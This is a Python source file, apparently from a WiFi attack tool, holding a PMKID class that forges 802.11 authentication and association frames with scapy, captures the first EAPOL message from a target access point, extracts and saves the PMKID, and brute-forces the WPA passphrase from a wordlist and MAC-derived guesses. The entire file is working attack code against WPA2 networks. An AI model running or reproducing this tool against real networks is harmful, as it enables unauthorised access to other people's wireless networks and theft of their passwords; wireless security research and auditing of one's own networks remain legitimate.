import binascii
import hashlib
import hmac
import re
import string
import sys
import threading
import time

from pbkdf2 import PBKDF2
from scapy.arch import get_if_raw_hwaddr
from scapy.layers.dot11 import (
    Dot11,
    Dot11AssoReq,
    Dot11AssoResp,
    Dot11Auth,
    Dot11Elt,
    RadioTap,
    Raw,
)
from scapy.layers.eap import EAPOL
from scapy.sendrecv import sendp, sniff

from utils.macers import org


class PMKID:
    def __init__(
        self,
        ap: str,
        essid: bytes,
        iface: str,
        beacon: object,
        _dict: str,
        passwords: str,
        pull: object,
        verbose: bool,
        nframes: int,
    ):
        """Initialise PMKID class with necessary parameters."""
        self.iface = iface
        self.essid = essid
        self.ap = ap
        self.cl = self.get_my_addr(iface)
        self.d_passes = self.comp_mac_passes(
            ap
        )
        self.beacon = beacon
        self.dict = _dict
        self.passwords = passwords
        self.pull = pull
        self.verbose = verbose
        self.retry_limit = 40
        self._randn = 1
        self._nframes = nframes
        self.auth = (
            self.auth_frame_blueprint(
                ap, self.cl
            )
        )
        self.asso = (
            self.asso_frame_blueprint(
                ap, self.cl
            )
        )

        self.AUTH_STATUS = False
        self.AUTH_STEP = False
        self.ASSO_STATUS = False
        self.ASSO_STEP = False
        self.EAPOL = None
        self.M_PLACED = False

    @staticmethod
    def get_my_addr(iface: str) -> str:
        """Retrieve the MAC address of the given interface."""
        _, hwaddr = get_if_raw_hwaddr(iface)
        hwaddr = binascii.hexlify(hwaddr)
        return ":".join(
            hwaddr[i : i + 2]
            for i in range(0, 12, 2)
        )

    @staticmethod
    def hexdump(
        src: bytes,
        length: int = 16,
        sep: str = ".",
    ) -> str:
        """Generate a hex dump of the provided byte source."""
        display = (
            string.digits
            + string.ascii_letters
            + string.punctuation
        )
        filter_chars = "".join(
            x if x in display else sep
            for x in map(chr, range(256))
        )

        lines = []
        for c in range(0, len(src), length):
            chars = src[c : c + length]
            hex_str = " ".join(
                f"{x:02x}" for x in chars
            )
            printable = "".join(
                filter_chars[ord(x)]
                for x in chars
            )
            lines.append(
                f"{c:08x}:  {hex_str:<{length * 3}}  |{printable}|\n"
            )

        return "".join(lines)

    def enumerate_asso_fields(self, pkt):
        """Extract relevant fields from the association packet."""
        elts = pkt.getlayer(Dot11Elt)
        data = {}

        try:
            for count in range(len(elts)):
                if elts[count].ID in {
                    0,
                    1,
                    48,
                    5,
                    50,
                    221,
                }:
                    data[elts[count].ID] = {
                        "ID": elts[count].ID,
                        "len": elts[
                            count
                        ].len,
                        "info": elts[
                            count
                        ].info,
                    }
        except IndexError:
            pass

        return data

    def auth_frame_blueprint(
        self, ap: str, cl: str
    ):
        """Create an authentication frame blueprint."""
        return (
            RadioTap()
            / Dot11(
                addr1=ap, addr2=cl, addr3=ap
            )
            / Dot11Auth(seqnum=1)
        )

    def form_asso_layers(
        self, fields: dict, pkt
    ):
        """Form the association layers based on extracted fields."""
        for key, val in fields.items():
            if key in {0, 1, 5, 48, 50, 221}:
                pkt /= Dot11Elt(
                    ID=val["ID"],
                    len=val["len"],
                    info=val["info"],
                )
        return pkt

    def asso_frame_blueprint(
        self, ap: str, cl: str
    ):
        """Create an association request frame."""
        capability = self.beacon.sprintf(
            "{Dot11Beacon:%Dot11Beacon.cap%}"
        )
        fields = self.enumerate_asso_fields(
            self.beacon
        )
        pkt = (
            RadioTap()
            / Dot11(
                addr1=ap, addr2=cl, addr3=ap
            )
            / Dot11AssoReq(
                cap=capability,
                listen_interval=3,
            )
        )
        return self.form_asso_layers(
            fields, pkt
        )

    def auth_sniffer(self):
        """Sniff for authentication responses."""
        self.AUTH_STATUS = True
        sniff(
            iface=self.iface,
            prn=self.get_auth_resp,
        )
        self.AUTH_STATUS = False

    def get_auth_resp(self, pkt):
        """Handle authentication responses."""
        if pkt.haslayer(
            RadioTap
        ) and pkt.haslayer(Dot11Auth):
            sn = pkt.getlayer(
                Dot11
            ).addr2.replace(":", "")
            rc = pkt.getlayer(
                Dot11
            ).addr1.replace(":", "")
            if rc == self.cl.replace(
                ":", ""
            ) and sn == self.ap.replace(
                ":", ""
            ):
                self.log_auth_response(
                    sn, rc
                )
                self.AUTH_STEP = True
                raise ValueError(
                    "Authentication packet received."
                )

    def log_auth_response(
        self, sn: str, rc: str
    ):
        """Log the authentication response based on verbosity."""
        message = (
            f"Received {self.cl.replace(':', '').upper()} "
            f"({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) "
            f"{self.pull.RED}< {self.pull.END} "
            f"{self.ap.replace(':', '').upper()} "
            f"({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) "
            f"{self.pull.YELLOW}[Open Authentication]{self.pull.END}"
        )

        if self.verbose:
            self.pull.info(message)
        else:
            self.pull.info(
                message.replace(
                    self.pull.DARKCYAN, ""
                ).replace(
                    self.pull.YELLOW, ""
                )
            )

    def dev_conn(self) -> bool:
        """Establish a device connection."""
        auth_thread = threading.Thread(
            target=self.auth_sniffer,
            daemon=True,
        )
        auth_thread.start()

        while not self.AUTH_STEP:
            self._randn_(3)
            self.log_authentication_request()
            sendp(
                self.auth,
                iface=self.iface,
                count=2,
                verbose=False,
            )
            time.sleep(1)
            if not self.AUTH_STATUS:
                break

        return self.AUTH_STEP

    def log_authentication_request(self):
        """Log the authentication request based on verbosity."""
        message = (
            f"{self._randn} Frames {self.cl.replace(':', '').upper()} "
            f"{self.pull.RED}< {self.pull.END} "
            f"{self.ap.replace(':', '').upper()} "
            f"{self.pull.BLUE}[Open Authentication]{self.pull.END}"
        )

        if self.verbose:
            self.pull.up(message)
        else:
            self.pull.up(
                message.replace(
                    self.pull.DARKCYAN, ""
                )
            )

    def asso_sniffer(self):
        """Sniff for association responses."""
        self.ASSO_STATUS = True
        sniff(
            iface=self.iface,
            prn=self.get_asso_resp,
        )
        self.ASSO_STATUS = False

    def get_asso_resp(self, pkt):
        """Handle association responses."""
        if (
            pkt.haslayer(Dot11AssoResp)
            and pkt.getlayer(
                Dot11AssoResp
            ).status
            == 0
        ):
            self.handle_association_pkt(pkt)

        if pkt.haslayer(EAPOL):
            self.handle_eapol_pkt(pkt)

    def handle_association_pkt(self, pkt):
        """Handle successful association responses."""
        sn = pkt.getlayer(
            Dot11
        ).addr2.replace(":", "")
        rc = pkt.getlayer(
            Dot11
        ).addr1.replace(":", "")
        if rc == self.cl.replace(
            ":", ""
        ) and sn == self.ap.replace(":", ""):
            self.log_association_response()

    def log_association_response(self):
        """Log the association response based on verbosity."""
        if not self.M_PLACED:
            message = (
                f"Authentication {self.ap.replace(':', '').upper()} "
                f"({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) "
                f"{self.pull.RED}>{self.pull.END} "
                f"{self.cl.replace(':', '').upper()} "
                f"({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) "
                f"{self.pull.GREEN}[Successful]{self.pull.END}"
            )

            if self.verbose:
                self.pull.info(message)
                self.pull.info(
                    f"EAPOL {self.ap.replace(':', '').upper()} "
                    f"({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) "
                    f"{self.pull.RED}>{self.pull.END} "
                    f"{self.cl.replace(':', '').upper()} "
                    f"({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) "
                    f"{self.pull.PURPLE}[Waiting...]%s"
                    % self.pull.END
                )
            else:
                self.pull.info(
                    message.replace(
                        self.pull.DARKCYAN,
                        "",
                    )
                )
                self.pull.info(
                    f"EAPOL {self.ap.replace(':', '').upper()} "
                    f"{self.pull.RED}>{self.pull.END} "
                    f"{self.cl.replace(':', '').upper()} "
                    f"{self.pull.PURPLE}[Waiting...]%s"
                    % self.pull.END
                )

            self.M_PLACED = True

    def handle_eapol_pkt(self, pkt):
        """Handle EAPOL packets."""
        sn = pkt.getlayer(
            Dot11
        ).addr2.replace(":", "")
        nonce = binascii.hexlify(
            pkt.getlayer(Raw).load
        )[26:90]
        mic = binascii.hexlify(
            pkt.getlayer(Raw).load
        )[154:186]
        fNONCE = "0000000000000000000000000000000000000000000000000000000000000000"
        fMIC = "00000000000000000000000000000000"

        if (
            sn == self.ap.replace(":", "")
            and nonce != fNONCE
            and mic == fMIC
        ):
            self.ASSO_STEP = True
            self.log_eapol_info()

    def log_eapol_info(self):
        """Log EAPOL packet initiation based on verbosity."""
        message = (
            f"EAPOL {self.ap.replace(':', '').upper()} "
            f"({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) "
            f"{self.pull.RED}>{self.pull.END} "
            f"{self.cl.replace(':', '').upper()} "
            f"({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) "
            f"{self.pull.YELLOW}[Initiated]{self.pull.END}"
        )

        if self.verbose:
            self.pull.info(message)
            self.pull.up(
                f"EAPOL {self.ap.replace(':', '').upper()} "
                f"({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) "
                f"{self.pull.RED}>{self.pull.END} "
                f"{self.cl.replace(':', '').upper()} "
                f"({self.pull.DARKCYAN + org(self.cl).org + self.pull.END}) "
                f"{self.pull.BOLD + self.pull.GREEN}[1 of 4]{self.pull.END}"
            )
        else:
            self.pull.info(
                message.replace(
                    self.pull.DARKCYAN, ""
                )
            )
            self.pull.up(
                f"EAPOL {self.ap.replace(':', '').upper()} "
                f"{self.pull.RED}>{self.pull.END} "
                f"{self.cl.replace(':', '').upper()} "
                f"{self.pull.BOLD + self.pull.GREEN}[1 of 4]{self.pull.END}"
            )

        raise ValueError(
            "EAPOL packet received."
        )

    def asso_conn(self) -> bool:
        """Establish an association connection."""
        if not self.ASSO_STATUS:
            asso_thread = threading.Thread(
                target=self.asso_sniffer,
                daemon=True,
            )
            asso_thread.start()

        retry = 0
        while not self.ASSO_STEP:
            self._randn_(4)
            self.log_association_request()
            sendp(
                self.asso,
                iface=self.iface,
                count=1,
                verbose=False,
            )
            time.sleep(2)
            retry += 1
            if retry >= self.retry_limit:
                self.pull.info(
                    "Maximum limit reached for Association Requests. Sleeping! Will restart in 30 seconds."
                )
                time.sleep(30)
                break

        return self.ASSO_STEP

    def log_association_request(self):
        """Log the association request based on verbosity."""
        message = (
            f"{self._randn} Frames {self.cl.replace(':', '').upper()} "
            f"{self.pull.RED}>{self.pull.END} "
            f"{self.ap.replace(':', '').upper()} "
            f"{self.pull.BLUE}[Association Request]{self.pull.END}"
        )

        if self.verbose:
            self.pull.up(message)
        else:
            self.pull.up(
                message.replace(
                    self.pull.DARKCYAN, ""
                )
            )

    def comp_mac_passes(
        self, mac: str
    ) -> list:
        """Generate possible passwords based on MAC address."""
        variations = [
            mac.replace(":", "").lower()[:8],
            mac.replace(":", "").upper()[:8],
            mac.replace(":", "").lower()[4:],
            mac.replace(":", "").upper()[4:],
        ]

        last_char = re.search(
            r"[0-9]$",
            mac.replace(":", "").lower()[:8],
            re.I,
        )
        if last_char:
            digit = int(last_char.group())
            for n in range(10):
                if n != digit:
                    variations.append(
                        mac.replace(
                            ":", ""
                        ).lower()[:8][:-1]
                        + str(n)
                    )
                    variations.append(
                        mac.replace(
                            ":", ""
                        ).upper()[:8][:-1]
                        + str(n)
                    )

        last_four_char = re.search(
            r"[0-9]$",
            mac.replace(":", "").lower()[4:],
            re.I,
        )
        if last_four_char:
            digit = int(
                last_four_char.group()
            )
            for n in range(10):
                if n != digit:
                    variations.append(
                        mac.replace(
                            ":", ""
                        ).lower()[4:][:-1]
                        + str(n)
                    )
                    variations.append(
                        mac.replace(
                            ":", ""
                        ).upper()[4:][:-1]
                        + str(n)
                    )

        return variations

    def printing_pass(
        self, p_pass: str, c_pass: str
    ) -> str:
        """Format the password display to align outputs."""
        len_A, len_B = (
            len(p_pass),
            len(c_pass),
        )
        if len_A:
            return (
                c_pass
                + (" " * (len_A - len_B))
                if len_A > len_B
                else c_pass
            )
        return c_pass

    def save(
        self, _write: str, PMKID: bytes
    ):
        """Save the PMKID capture to a file."""
        if _write:
            with open(_write, "w") as _file:
                _file.write(
                    f"{PMKID}*{self.ap.replace(':', '').lower()}*{self.cl.replace(':', '').lower()}*{binascii.hexlify(self.essid)}\n"
                )
            self.pull.use(
                f"PMKID -> {self.pull.RED}{_write}{self.pull.END} {self.pull.GREEN}[Saved]{self.pull.END}"
            )
        else:
            self.pull.error(
                "PMKID not saved. Provide -w, --write option to save the capture."
            )

    def crack(self, _write: str):
        """Attempt to crack the PMKID."""
        fPMKID = "00000000000000000000000000000000"
        PMKID = binascii.hexlify(
            self.EAPOL.getlayer(Raw).load
        )[202:234]
        if fPMKID != PMKID and PMKID:
            self.pull.special(
                "Vulnerable to PMKID Attack!"
            )
            self.log_pmkid_info(PMKID)
            self.save(_write, PMKID)

            _pmk = self.crack_the_pmk(PMKID)
            return _pmk
        else:
            self.pull.error(
                "The target AP doesn't contain PMKID field. Not Vulnerable. Try with a handshake."
            )
            sys.exit(0)

    def log_pmkid_info(self, PMKID: bytes):
        """Log the PMKID information based on verbosity."""
        if self.verbose:
            self.pull.up(
                f"PMKID {self.ap.replace(':', '').upper()} "
                f"({self.pull.DARKCYAN + org(self.ap).org + self.pull.END}) [{self.pull.RED + PMKID + self.pull.END}]"
            )
        else:
            self.pull.up(
                f"PMKID {self.ap.replace(':', '').upper()} [{self.pull.RED + PMKID + self.pull.END}]"
            )

    def crack_the_pmk(
        self, _hash: str
    ) -> tuple:
        """Attempt to recover the PMK based on the provided hash."""
        _pass_list = (
            self.passwords.split(",")
            if isinstance(
                self.passwords, str
            )
            else open(
                self.dict, "r"
            ).readlines()
        )

        last_pass = ""

        for _pass in _pass_list:
            self.pull.up(
                f"Currently Checking: {self.pull.BOLD}{self.printing_pass(last_pass, _pass.rstrip())}{self.pull.END}"
            )
            last_pass = _pass.rstrip()
            pmk = PBKDF2(
                _pass, self.essid, 4096
            ).read(32)
            ap = binascii.a2b_hex(
                self.ap.replace(
                    ":", ""
                ).lower()
            )
            cl = binascii.a2b_hex(
                self.cl.replace(
                    ":", ""
                ).lower()
            )
            _pmk_fs = b"PMK Name"
            hash_ = hmac.new(
                pmk,
                _pmk_fs + ap + cl,
                hashlib.sha1,
            ).hexdigest()[:32]
            if _hash == hash_:
                return (
                    _pass,
                    self.hexdump(pmk),
                    self.hexdump(hash_),
                )
            else:
                if _pass != _pass_list[-1]:
                    self.pull.lineup()

        return None, "", ""

    def _randn_(self, _max: int):
        """Randomness function to determine how many frames to consider."""
        if self._nframes == 0:
            self._randn = org().randomness(
                _max, self._randn
            )
        else:
            self._randn = self._nframes
        return
